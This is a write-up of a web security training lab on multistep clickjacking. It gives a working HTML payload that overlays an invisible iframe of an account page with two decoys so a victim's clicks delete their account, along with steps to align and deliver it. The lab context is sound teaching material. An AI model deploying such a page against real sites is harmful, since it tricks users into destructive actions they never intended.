# Lab 06 — Multistep clickjacking

> **Expert** · [Official lab](https://portswigger.net/web-security/clickjacking/lab-multistep)

**Entry point:** account deletion is a **two-step** flow (Delete → Confirm
"Yes") — both clicks must be hijacked.

## Solution

```html
<style>
  iframe { position: relative; width: 500px; height: 700px;
           opacity: 0.0001; z-index: 2; }
  .firstClick, .secondClick { position: absolute; z-index: 1; }
  .firstClick  { top: 330px; left: 50px; }
  .secondClick { top: 285px; left: 225px; }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

1. Align decoy 1 over **Delete account**, decoy 2 over the confirmation
   page's **Yes** button (tune with `opacity: 0.1` first).
2. Deliver to victim — their two clicks walk the flow and delete the
   account — lab solved.

## Notes

Multi-step flows feel safer but every step is just another click to hijack —
only framing protections actually stop this.
